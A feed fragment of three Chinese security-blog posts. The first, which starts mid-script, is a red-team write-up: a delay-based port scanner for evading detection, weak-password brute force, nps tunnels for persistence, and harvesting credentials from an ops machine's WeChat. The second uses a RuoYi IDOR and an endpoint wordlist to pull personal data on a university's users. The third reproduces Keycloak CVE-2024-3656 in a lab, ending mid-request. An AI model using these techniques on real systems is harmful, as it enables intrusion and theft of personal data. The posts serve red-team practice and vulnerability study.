    for ip in network.hosts():
        ip_str = str(ip)
        
        # 扫描7680端口但不判断结果
        scan_port(ip_str, 7680)
        
        # 扫描9100端口并仅打印开放的IP
        if scan_port(ip_str, 9100):
            print(f&quot;Port 9100 is open on {ip_str}&quot;)

        # 随机延迟时间，范围在10毫秒到3秒之间
        delay = random.uniform(0.01, 3)
        time.sleep(delay)

if __name__ == &quot;__main__&quot;:
    main()&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;根据扫描结果获取大量的打印机，这里手动增加端口，规避批量扫描的风险&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-10-30/1730258833-540842-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;访问打印机自己加端口80或者443一般都可，无需再扫描端口&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-10-30/1730258855-278675-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;当然对于打印机来说，默认情况下FTP是开启的，为得分是可以尝试连接，批量匿名用户登录截图即可&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-10-30/1730258906-469134-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;由于已经摸清网络拓扑架构，吃饭时间直接开始拼手速，确保短平快的结束内网。扫描服务器段发现存在ssh弱口令&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-10-30/1730258926-536728-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;连接服务器发现可出网，权限维持，linux主机直接使用nps权限维持即可，多做几个隧道，防止VPN被发现。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-10-30/1730258958-101159-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;比较遗憾，还是被发现了，防火墙vpn的入口被切掉了，脚本的扫描确实太耗时了，比较幸运的是拼手速做的隧道还在。&lt;/p&gt;

&lt;h5&gt;决定利用跳板直接一把梭&lt;/h5&gt;

&lt;p&gt;使用工具对内网办公网进行若口令爆破，考虑目标单位的特殊性，直接使用的是密码为&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;123
0
1
000000
888888&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这四个弱口令进行的爆破，巧合的是内网大量的终端口令均为&lt;strong&gt;X&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-10-30/1730259042-215079-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;巧合的是第二台机器RDP连接发现为运维机&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-10-30/1730259081-591382-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;连接RDP发现该运维桌面上存在运维工作台的客户端&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-10-30/1730259105-599564-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;登录控制服务器+终端六百多台&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-10-30/1730259206-664122-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;但是比较有意思的运维终端无网络设备的权限，无密码记录但是有连接记录，接下来是重点&lt;/p&gt;

&lt;h6&gt;微信查询聊天记录&lt;/h6&gt;

&lt;p&gt;远程运维机后，运维机的微信是登录在线的，根据记录搜索聊天记录的密码&lt;/p&gt;

&lt;p&gt;根据运维群群名搜索&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-10-30/1730259311-677756-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;连接卡巴服务器&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-10-30/1730259330-681665-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;这里可以利用卡巴下发任务服务器批量上线，因为考虑到担心影响业务，上报裁判组后到此为止，利用EDR批量控制下发文件上线的操作不算难&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;根据运维人员同事聊天记录搜索&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-10-30/1730259370-368480-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;发现大量的安全设备以及网络设备的密码，连接核心汇聚等交换机&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-10-30/1730259392-561892-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;同时利用运维机器浏览器保存的应用系统的账号密码登录系统取证，这里给上截图&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-10-30/1730259430-61894-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;到此，目标单位全部打穿。&lt;/p&gt;

&lt;h4&gt;小结&lt;/h4&gt;

&lt;p&gt;本次红队本来是打算规避一下防守队来进行，但是动作还是被发现了，一把梭之前可能被发现是因为队友做其它扫描了，因为脚本的扫描延迟是在2s之上的，以某服的态感规则为例，扫描类的阈值是放在2s的。如果没有自定义的剧本来监测行为一般还是很难发现的。&lt;/p&gt;

&lt;p&gt;这个案例比较值有意义值得记录的有五点&lt;/p&gt;

&lt;ul&gt;&lt;li&gt;利用边界出口防火墙启用SSLVPN实现突破边界&lt;/li&gt;
&lt;li&gt;运维机的微信聊天记录查询关键词实现控制EDR&lt;/li&gt;
&lt;li&gt;扫描增加时间延时规避设备感知&lt;/li&gt;
&lt;li&gt;在获取拼手速阶段获取的linux主机都出网，及时的搭建好了多个隧道&lt;/li&gt;
&lt;li&gt;大成果的突破点不单单局限于服务器区，同样办公网突破的成果是巨大的、&lt;/li&gt;&lt;/ul&gt;

&lt;p&gt;比较取巧的有三点&lt;/p&gt;

&lt;ul&gt;&lt;li&gt;办公网巧合的获取运维机的权限&lt;/li&gt;
&lt;li&gt;运维人员的微信在线&lt;/li&gt;
&lt;li&gt;运维工作台C/S架构的记住密码导致对该目标直接被打穿。&lt;/li&gt;&lt;/ul&gt;

&lt;p&gt;值得强调的是在红队攻击的过程中对于边界设备的利用不要单单局限于传统的VPN设备，比如通过防火墙自己划分资源开启SSLVPN实现成果扩大也是很好的选择。本次红队中一把梭没有从服务器区开始是考虑到服务器区的边界防护必定要强于办公网，这点儿的决策也是正确的。&lt;/p&gt;</description><link>https://zone.huoxian.cn/d/2958-firewall</link><guid isPermaLink="false">https://zone.huoxian.cn/d/2958-firewall</guid><pubDate>Wed, 30 Oct 2024 03:39:14 GMT</pubDate><author>和</author><category>原创文章</category><category>应用安全</category><category>redteam</category></item><item><title>记录灯塔收集学校信息，攻击薄弱点站点，拿到5K+的敏感信息</title><description>&lt;h1&gt;前言&lt;/h1&gt;
&lt;p&gt;记录如何拿到一所学校该如何攻打，寻找漏洞的手法和思路，在分析可疑资产的时候，只举例两个，实际上从学校域名到漏洞站点，花费了很多的时间，一个一个站点分析，猜测，最后才找的漏洞站点，一定要细心。&lt;/p&gt;

&lt;h1&gt;0x1  信息收集&lt;/h1&gt;
&lt;h2&gt;1、收集资产可疑的站点&lt;/h2&gt;
&lt;p&gt;假设我们的学校为“xxx 大学”，通过 Google 找到 &lt;a href=&quot;https://www.xxx.edu.cn/&quot; rel=&quot;ugc noopener nofollow&quot; target=&quot;_blank&quot;&gt;https://www.xxx.edu.cn/&lt;/a&gt; 主域名地址，然后将 xxx.edu.cn ，直接丢到灯塔中去扫描子域名和敏感文件，打 edu 一般就开这两个功能点，或者通过 fofa、鹰图一些资产测绘的去收集信息。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://nc0.cdn.zkaq.cn/md/22012/27c5f4bf8e1a75989eec035de4844809_12024.png&quot; title=&quot;&quot; alt=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;br&gt;
等到灯塔扫描完成后，我直接查看文件泄露的信息，所谓渗透不就是从资产的薄弱面去攻击吗，看看有无一些敏感信息泄露，然后根据泄露信息的站点进一步的攻击，比使用 fofa 通过 domain=“xxx.edu.cn”扫出的信息，更有目标性。&lt;/p&gt;
&lt;h2&gt;2、分析可疑资产&lt;/h2&gt;
&lt;p&gt;发现一个子域名，报错为 spring boot，通常这中，直接使用曾哥的 spring boot-scan 扫描结果，看会不会出结果。&lt;/p&gt;

&lt;p&gt;扫过之后，又尝试拼接路径，还是木有出现任何信息。放弃看下一个。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://nc0.cdn.zkaq.cn/md/22012/c04f4fc48b2f497e2cf092040bb83332_25565.png&quot; title=&quot;&quot; alt=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;。。。。。&lt;/p&gt;

&lt;p&gt;发现一个地址存在 xxx.edu.cn:8080/prod-api/这个接口一看就是若依啊，访问但是直接报错&lt;/p&gt;
	
&lt;p&gt;&lt;img src=&quot;https://nc0.cdn.zkaq.cn/md/22012/44ddeaf7cc7bb008f653df9a3ef22185_24423.png&quot; title=&quot;&quot; alt=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;尝试在后面加上若依的的常见路径，试一下，还是报错，直接将 prod-api这个路径删除，加载的页面，经典的若依系统。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://nc0.cdn.zkaq.cn/md/22012/4694079703ac57df9dd3ab5fc8707859_83926.png&quot; title=&quot;&quot; alt=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;可以注册，直接注册用户登录&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://nc0.cdn.zkaq.cn/md/22012/5d20d902cd492d770a60154cf06579bc_33299.png&quot; title=&quot;&quot; alt=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://nc0.cdn.zkaq.cn/md/22012/eb60b73318152b181c8d0a9161c8d824_67764.png&quot; title=&quot;&quot; alt=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;


&lt;h1&gt;0x2  漏洞挖掘&lt;/h1&gt;

&lt;p&gt;&lt;img src=&quot;https://nc0.cdn.zkaq.cn/md/22012/a151275ad1d9a254810559c3a8181f4a_73956.png&quot; title=&quot;&quot; alt=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;br&gt;
进来之后，随便点点，查看数据包，有无敏感信息之类的，因为若依系统后台漏洞就那几个，sql 注入、计划任务、接口泄露信息等，但是这个系统，因该被修复过，注入点什么也没有发现。&lt;br&gt;
像这种 spring 的站点，在查看个人信息的地方最 happy了，也是最容易出现信息泄露的问题&lt;br&gt;
查看个人信息的数据包，观察是否可以遍历？&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://nc0.cdn.zkaq.cn/md/22012/6dd01e4af474ccac1ef319e14b58fb3e_82559.png&quot; title=&quot;&quot; alt=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;将 profile 改为 list、Infolist、page 等，直接告诉我们没有权限&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://nc0.cdn.zkaq.cn/md/22012/dea40cac09c0d3e865438d14e15f162d_21307.png&quot; title=&quot;&quot; alt=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;欧克，将若依敏感路径跑一遍&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/system/duplicate/check
/system/fillRule/add
/system/fillRule/delete
/system/fillRule/deleteBatch
/system/fillRule/edit
/system/fillRule/executeRuleByCode/
/system/fillRule/exportXls
/system/fillRule/importExcel
/system/fillRule/list
/system/fillRule/testFillRule
/system/gatewayRoute/clearRedis
/system/gatewayRoute/delete
/system/gatewayRoute/list
/system/gatewayRoute/updateAll
/system/getEncryptedString
/system/log/list
/system/login
/system/loginfo
/system/logout
/system/message/systemMessage/add
/system/message/systemMessage/delete
/system/message/systemMessage/deleteBatch
/system/message/systemMessage/edit
/system/message/systemMessage/list
/system/message/systemMessageTemplate/add
/system/message/systemMessageTemplate/delete
/system/message/systemMessageTemplate/deleteBatch
/system/message/systemMessageTemplate/edit
/system/message/systemMessageTemplate/list
/system/message/systemMessageTemplate/sendMsg
/system/online/forceLogout
/system/online/list
/system/oss/file/delete
/system/oss/file/list
/system/oss/file/upload
/system/permission/add
/system/permission/addPermissionRule
/system/permission/delete
/system/systemDepartRole/deptRoleUserAdd
/system/systemDepartRole/edit
/system/systemDepartRole/getDeptRoleByUserId
/system/systemDepartRole/getDeptRoleList
/system/systemDepartRole/list
/system/systemUserAgent/add
/system/systemUserAgent/edit
/system/systemUserAgent/queryByUserName
/system/tenant/add
/system/tenant/delete
/system/tenant/deleteBatch
/system/tenant/edit
/system/tenant/list
/system/tenant/queryById
/system/tenant/queryList
/system/third/user/checkPassword
/system/third/user/create
/system/thirdApp/getEnabledType
/system/thirdApp/recallMessageTest
/system/thirdApp/sendMessageTest
/system/thirdApp/sync/dingtalk/depart
/system/thirdApp/sync/dingtalk/user
/system/thirdApp/sync/wechatEnterprise/depart
/system/thirdApp/sync/wechatEnterprise/user
/system/thirdLogin/bindingThirdPhone
/system/thirdLogin/getLoginUser/
/system/thirdLogin/oauth2/
/system/thirdLogin/render/
/system/upload/uploadMinio
/system/user/add
/system/user/addSystemUserRole
/system/user/changePassword
/system/user/checkOnlyUser
/system/user/delete
/system/user/deleteBatch
/system/user/deleteRecycleBin
/system/user/deleteUserInDepart
/system/user/deleteUserInDepartBatch
/system/user/deleteUserRole
/system/user/deleteUserRoleBatch
/system/user/departUserList
/system/user/edit
/system/user/editSystemDepartWithUser
/system/user/exportXls
/system/user/frozenBatch
/system/user/generateUserId
/system/user/getCurrentUserDeparts
/system/user/getMultiUser
/system/user/list
/system/user/passwordChange
/system/user/phoneVerification
/system/user/putRecycleBin
/system/user/queryByIds
/system/user/queryByOrgCodeForAddressList
/system/user/queryUserByDepId
/system/user/queryUserComponentData
/system/user/queryUserRole
/system/user/recycleBin
/system/user/register&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;没有一个成功的，发现一个点，只有 /prod-api/system/user/&lt;em&gt;/prod-api/system/role/&lt;/em&gt;这两个接口，提示说参数类型不匹配，其他都是错误报错&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://nc0.cdn.zkaq.cn/md/22012/5b20a487a009450c7ab9fe9c833e0a7b_30000.png&quot; title=&quot;&quot; alt=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://nc0.cdn.zkaq.cn/md/22012/d3d47a5305911ac4af45fa18b53ece8a_40977.png&quot; title=&quot;&quot; alt=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;br&gt;
根据提示，将 user 和 role 的后面改为数字 1，就查到 admin 的敏感信息&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://nc0.cdn.zkaq.cn/md/22012/caf373d43c2f8c6bf940f3c818785cdb_20550.png&quot; title=&quot;&quot; alt=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://nc0.cdn.zkaq.cn/md/22012/1529c37a19a08a1388361e7ec86101fd_18737.png&quot; title=&quot;&quot; alt=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;遍历数字 1，即可拿到系统内所有人的敏感信息，但是 password 是加盐的，解不开，不过可以获得其他人身份证号和邮箱地址，手机号等信息&lt;br&gt;
想要获取其他的漏洞，但是都存在鉴权，拿不到管理员的权限&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://nc0.cdn.zkaq.cn/md/22012/13c5324d8ddaeafdef6436e8e445f681_76310.png&quot; title=&quot;&quot; alt=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://nc0.cdn.zkaq.cn/md/22012/3ccfe83723b1b8785516ec2cc0a39899_97787.png&quot; title=&quot;&quot; alt=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;br&gt;
所以这个站就先这样了。&lt;/p&gt;</description><link>https://zone.huoxian.cn/d/2957-5k</link><guid isPermaLink="false">https://zone.huoxian.cn/d/2957-5k</guid><pubDate>Mon, 21 Oct 2024 08:21:57 GMT</pubDate><author>sys0ne</author><category>原创文章</category><category>挖洞姿势</category><category>实战攻防</category></item><item><title>重生之我在推特逛漏洞</title><description>&lt;p&gt;今天刚好闲着没事，逛了一下推特，刚好看到一个漏洞有关Keycloak，已经有漏洞编号了：CVE-2024-3656&lt;/p&gt;

&lt;h2&gt;漏洞原理&lt;/h2&gt;
&lt;p&gt;Keycloak &amp;lt; 24.0.5 容易受到 Broken Access Control 漏洞的攻击，攻击者可以使用任何经过身份验证的用户来执行某些 api 操作，例如：&lt;br&gt;
通过 testLDAPConnection 端点测试 LDAP 连接,攻击者可以与外部主机的 LDAP 交互。&lt;/p&gt;

&lt;h2&gt;漏洞影响&lt;/h2&gt;
&lt;p&gt;影响数量巨大，在FOFA上发现了 101k+ 结果&lt;br&gt;
FOFA 查询：app=“KEYCLOAK-IAS”，不过好在该漏洞需要先获取一个普通用户权限，所以受影响用户首先对账号进行安全管理，确保不存在弱口令，有条件的用户可以进行升级处理&lt;br&gt;
该漏洞在野外被积极利用，并已集成到 Patrowl 中&lt;/p&gt;
&lt;h2&gt;漏洞复现过程&lt;/h2&gt;
&lt;p&gt;按照推特的指引，我们找到了这个漏洞的相关信息，开源产品，可以有多种方法搭建相关环境，当然，我们选择最简单的，使用docker 一键搭建&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.z.wiki/autoupload/20241017/G9UE/1305X835/image.png&quot; title=&quot;&quot; alt=&quot;1305X835/image.png&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;我们选择24.0.4的版本进行下载&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.z.wiki/autoupload/20241017/uLYk/2107X885/image.png&quot; title=&quot;&quot; alt=&quot;2107X885/image.png&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;https://quay.io/repository/keycloak/keycloak?tab=tags&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.z.wiki/autoupload/20241017/hfsW/1732X694/image.png&quot; title=&quot;&quot; alt=&quot;1732X694/image.png&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;拉取镜像文件&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;docker pull quay.io/keycloak/keycloak:24.0.4&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;启动环境&lt;/p&gt;

&lt;pre&gt;&lt;code&gt; docker run -e KEYCLOAK_ADMIN=admin -e KEYCLOAK_ADMIN_PASSWORD=123#$%adH -p 8080:8080  quay.io/keycloak/keycloak:24.0.4  start-dev&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;访问站点会自动跳转到登陆页面：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;http://192.168.19.159:8080/&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.z.wiki/autoupload/20241017/2yyP/1561X978/image.png&quot; title=&quot;&quot; alt=&quot;1561X978/image.png&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;成功登陆&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.z.wiki/autoupload/20241017/TLJK/1632X1198/image.png&quot; title=&quot;&quot; alt=&quot;1632X1198/image.png&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;


&lt;p&gt;接下来看下漏洞具体原因，根据GitHub仓库提交的信息&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;https://github.com/keycloak/keycloak/commit/d9f0c84b797525eac55914db5f81a8133ef5f9b1&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.z.wiki/autoupload/20241017/Je70/1675X1360/image.png&quot; title=&quot;&quot; alt=&quot;1675X1360/image.png&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;


&lt;p&gt;查看更新信息，有3个文件已被修改：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;TestLdapConnectionResource.java 
UserResource.java 
ClientRegistrationPolicyResource.java&lt;/code&gt;&lt;/pre&gt;


&lt;p&gt;仔细分析 TestLdapConnectionResource.java 中的代码更改：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;public Response testLDAPConnection(TestLdapConnectionRepresentation config) {

try {
LDAPServerCapabilitiesManager.testLDAP(config, session, realm);
return Response.noContent().build();
} catch(Exception e) {
String errorMsg = LDAPServerCapabilitiesManager.getErrorCode(e);
throw ErrorResponse.error(errorMsg, Response.Status.BAD_REQUEST);
}
}
}&lt;/code&gt;&lt;/pre&gt;


&lt;p&gt;修复后的代码auth.realm().requireManageRealm(); 增加了认证，说明了需要具有管理者权限的用户才能调用这个调用 testLDAPConnection接口。这样可以说明在未修复之前，在realm的普通用户应该是可以调用这个接口的&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;public Response testLDAPConnection(TestLdapConnectionRepresentation config) {
auth.realm().requireManageRealm(); // Added permission check
try {
LDAPServerCapabilitiesManager.testLDAP(config, session, realm);
return Response.noContent().build();
}
// Exception handling...
}&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;我们看下这个接口传递的参数是什么：TestLdapConnectionRepresentation config&lt;/p&gt;

&lt;p&gt;根据这个信息我们可以在Keycloak仓库全局搜一下这个关键字&lt;br&gt;
：TestLdapConnectionRepresentation&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.z.wiki/autoupload/20241017/Z7Dk/1329X625/image.png&quot; title=&quot;&quot; alt=&quot;1329X625/image.png&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;找到了，进去看看&lt;/p&gt;

&lt;p&gt;可以看到需要传递的参数为action, connectionUrl, bindDn, bindCredential, useTruststoreSpi, connectionTimeout都为string类型&lt;/p&gt;


&lt;pre&gt;&lt;code&gt; public TestLdapConnectionRepresentation(String action, String connectionUrl, String bindDn, String bindCredential, String useTruststoreSpi, String connectionTimeout) {
this(action, connectionUrl, bindDn, bindCredential, useTruststoreSpi, connectionTimeout, null, null, null);
}&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.z.wiki/autoupload/20241017/Bnnp/1402X585/image.png&quot; title=&quot;&quot; alt=&quot;1402X585/image.png&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;接下来复现漏洞需要创建一个realm&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.z.wiki/autoupload/20241017/rZZU/1197X952/image.png&quot; title=&quot;&quot; alt=&quot;1197X952/image.png&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;在realm创建个普通用户测试看看&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.z.wiki/autoupload/20241017/vc0L/1747X903/image.png&quot; title=&quot;&quot; alt=&quot;1747X903/image.png&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.z.wiki/autoupload/20241017/RXFN/1338X825/image.png&quot; title=&quot;&quot; alt=&quot;1338X825/image.png&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;创建完，需要设置密码&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.z.wiki/autoupload/20241017/mrXt/1800X1155/image.png&quot; title=&quot;&quot; alt=&quot;1800X1155/image.png&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;重新打开站点，进入到guestrealm（刚才创建的realm），使用刚才创建的用户登陆&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://192.168.19.159:8080/realms/guestrealm/protocol/openid-connect/auth?client_id=account-console&quot; rel=&quot;ugc noopener nofollow&quot; target=&quot;_blank&quot;&gt;http://192.168.19.159:8080/realms/guestrealm/protocol/openid-connect/auth?client_id=account-console&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;成功登陆后，能成功跳转到这个页面即为成功&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.z.wiki/autoupload/20241017/TviP/2407X1005/image.png&quot; title=&quot;&quot; alt=&quot;2407X1005/image.png&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;接下来将流量代理到burp中，刷新一下界面，自动获取&lt;br&gt;
authorization: Bearer 认证信息&lt;br&gt;
找到请求为xxxx/protocol/openid-connect/token的流量，查看响应，响应里面的access_token的信息就是我们需要获取的（具有时效性，会失效，需要重新获取）&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.z.wiki/autoupload/20241017/dfb8/1728X982/image.png&quot; title=&quot;&quot; alt=&quot;1728X982/image.png&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;发送数据包，替换authorization: Bearer 的值，connectionUrl的值即可&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;POST /admin/realms/guestrealm/testLDAPConnection HTTP/1.1
Host: 192.168.19.159:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
content-type: application/json
authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJsUGRCVl9GaU1TUmFWZ002YUZiWTEzU2RGX2Fkd201TTFZZHNTSm54NXFVIn0.eyJleHAiOjE3MjkxNTk1NTEsImlhdCI6MTcyOTE1OTI1MSwiYXV0aF90aW1lIjoxNzI5MTU3MTYwLCJqdGkiOiJlZDA4NjJhZS03NzdhLTQzYTQtYmQzNy1jMjhlZjYxMWVkZjIiLCJpc3MiOiJodHRwOi8vMTkyLjE2OC4xOS4xNTk6ODA4MC9yZWFsbXMvZ3Vlc3RyZWFsbSIsImF1ZCI6ImFjY291bnQiLCJzdWIiOiJjN2VlZGYxZC1iN2QxLTQ4MzYtOTVhMC0xNTc0NTdjYzJmZTYiLCJ0eXAiOiJCZWFyZXIiLCJhenAiOiJhY2NvdW50LWNvbnNvbGUiLCJub25jZSI6IjY3ZmIxZTI2LWI2OTctNDNlYS04YWE4LWYyMWE2YTllZTI4NiIsInNlc3Npb25fc3RhdGUiOiJhZDJlMzI1ZC05MzEwLTRjMmMtOTI1OC01YWY3ZDYzY2M2ZTEiLCJhY3IiOiIwIiwicmVzb3VyY2VfYWNjZXNzIjp7ImFjY291bnQiOnsicm9sZXMiOlsibWFuYWdlLWFjY291bnQiLCJtYW5hZ2UtYWNjb3VudC1saW5rcyJdfX0sInNjb3BlIjoib3BlbmlkIGVtYWlsIHByb2ZpbGUiLCJzaWQiOiJhZDJlMzI1ZC05MzEwLTRjMmMtOTI1OC01YWY3ZDYzY2M2ZTEiLCJlbWFpbF92ZXJpZmllZCI6ZmFsc2UsIm5hbWUiOiJndWVzdCBndWVzdCIsInByZWZlcnJlZF91c2VybmFtZSI6Imd1ZXN0IiwiZ2l2ZW5fbmFtZSI6Imd1ZXN0IiwiZmFtaWx5X25hbWUiOiJndWVzdCIsImVtYWlsIjoiZ3Vlc3RAcXEuY29tIn0.HONCke7YEVE204ruPXGdYL81e1YPHw-f5Je4JaLDsfta7XTiQTSVToe3uDokJT2NaihtJ2ZpBJG_M1uCyZAuSLKyYkItuczKgmug6ExzvJNdCTjNUoPbDETZXQx8UM_v14p0BdakLB8xC3_2Tx9iJGS5yc4_RPypWzzaV7Drzq-SEF8Ch9aBDsWv3A6_A00tABTWi6OOTGl9p-mSdecomckMxAt_gTplHPUk6Qr72AwnEMM7xr_GQ4x2ozciSgE1403Xukpv6i6L0BDyaKj1in5UcMcBJsgemfso5OdNHWI0-OlDf14iacVZT_Zv4YSp_v7j6Cyoq05PQ9_aIcLzBg
Content-Length: 279




{

